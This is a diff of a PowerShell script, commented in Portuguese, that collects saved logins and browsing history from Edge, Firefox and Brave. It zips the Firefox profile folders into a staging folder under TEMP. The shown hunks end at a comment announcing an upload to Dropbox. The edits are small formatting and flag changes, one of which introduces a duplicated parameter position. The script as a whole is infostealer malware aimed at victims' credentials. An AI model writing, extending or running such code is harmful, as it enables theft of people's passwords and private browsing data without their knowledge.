@@ -482,9 +482,9 @@ function Get-BrowserData {
 
     [CmdletBinding()]
     param (    
-        [Parameter(Position=1,Mandatory = $True)]
+        [Parameter (Position=1,Mandatory = $True)]
         [string]$Browser,    
-        [Parameter(Position=2,Mandatory = $True)]
+        [Parameter (Position=1,Mandatory = $True)]
         [string]$DataType 
     ) 
 
@@ -514,8 +514,8 @@ function Get-BrowserData {
 }
 
 # Criar uma pasta para os dados do navegador
-$BrowserDataFolder = "$Env:TEMP\$FolderName\Dados-do-Browser"
-New-Item -ItemType Directory -Path $BrowserDataFolder -Force | Out-Null
+$BrowserDataFolder = "$env:TEMP\$FolderName\Dados-do-Browser"
+New-Item -ItemType Directory -Path $BrowserDataFolder | Out-Null
 
 # Salvar os dados do navegador dentro da nova pasta
 Get-BrowserData -Browser "edge" -DataType "history" | Out-File "$BrowserDataFolder\BrowserData.txt"
@@ -527,7 +527,7 @@ Get-BrowserData -Browser "firefox" -DataType "logins" | Out-File "$BrowserDataFo
 Get-BrowserData -Browser "brave" -DataType "history" | Out-File "$BrowserDataFolder\BrowserData.txt"
 Get-BrowserData -Browser "brave" -DataType "logins" | Out-File "$BrowserDataFolder\BrowserData.txt"
 
-# Função para comprimir arquivos específicos e movê-los para a pasta "Dados-do-Browser"
+# Comprimir arquivos Firefox e movê-los para a pasta "Dados-do-Browser"
 function Compress-And-MoveFilesToBrowserDataFolder {
     param (
         [string]$SourceFolder,
@@ -560,12 +560,11 @@ function Compress-And-MoveFilesToBrowserDataFolder {
 
     # Mover o arquivo comprimido para a pasta "Dados-do-Browser"
     $DestinationPath = Join-Path -Path $DestinationFolder -ChildPath "Dados-do-Browser"
-    New-Item -ItemType Directory -Path $DestinationPath -Force | Out-Null
     Move-Item -Path $ZipFilePath -Destination $DestinationPath -Force
 }
 
 # Chamar a função para comprimir e mover os arquivos
-Compress-And-MoveFilesToBrowserDataFolder -SourceFolder "$Env:APPDATA\Mozilla\Firefox\Profiles" -DestinationFolder "$Env:TEMP\$FolderName"
+Compress-And-MoveFilesToBrowserDataFolder -SourceFolder "$Env:APPDATA\Mozilla\Firefox\Profiles" -DestinationFolder "$env:TEMP\$FolderName"
 
 # Upload para a Dropbox
 
